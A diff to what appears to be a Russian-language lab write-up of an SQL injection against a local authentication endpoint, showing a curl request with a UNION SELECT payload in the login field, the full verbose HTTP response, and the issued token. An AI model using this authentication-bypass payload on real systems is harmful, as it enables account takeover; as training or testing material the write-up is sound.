@@ -5,11 +5,36 @@
 
 
 2. Код подтверждения*
-curl -v "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '1111', null, null -- \", \"code\":\"1111\"}"
+└─$ curl -v "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '1111', null, null -- \", \"code\":\"1111\"}"
 
-Результат:
+2.1 Результат:
+
+
+*   Trying 127.0.0.1:8888...
+* Connected to localhost (127.0.0.1) port 8888 (#0)
+> POST /api/auth/verification HTTP/1.1
+> Host: localhost:8888
+> User-Agent: curl/7.88.1
+> Accept: */*
+> Content-Type:application/json
+> Content-Length: 84
+> 
+< HTTP/1.1 200 OK
+< Server: nginx/1.19.6
+< Date: Thu, 20 Apr 2023 10:27:48 GMT
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 268
+< Connection: keep-alive
+< X-Powered-By: Express
+< Access-Control-Allow-Origin: *
+< ETag: W/"10c-1RH+8lIPSV12fQNBVYoBKZae/S8"
+< 
 * Connection #0 to host localhost left intact
-{"token":"56a54c8125e738cdfb11c17afb26895c2c6fa3f459eb87fd94f4c7d62bc720edb1599281692da7dd0e0d1bbe4113e308947ba7d0b5b6e3eda578252db3071f71aa4528c1cb7973a751fb06981a9c410447175cd3c0ae3dd60d474b7e44cced3a0b6c07b65f822b6ef570825084be3342c92b81dc56e73b2eaa4bef10bd59f8db"}    
+
+2.2 Токен:
+
+{"token":"221aff37be2d0435598f54c6cee22e5a4175f77dafeb3f57b45f028fdba505b769cc0d402f22d7e568fff09fa7fe8f46fb3fd7edad4d03bcf1a6100f2c788009dcc45123f19a6881e77cf91bb8e1cb9ea83d7c6f5e0d68c46000fdad76dcb6e2e591f650e12a7a152f6271acfa7fbd76e2242152742bb8a66d6f9ddab59f4f41"}     
+
 
 Комментарий:
 объединенный  запрос с помощью UNION
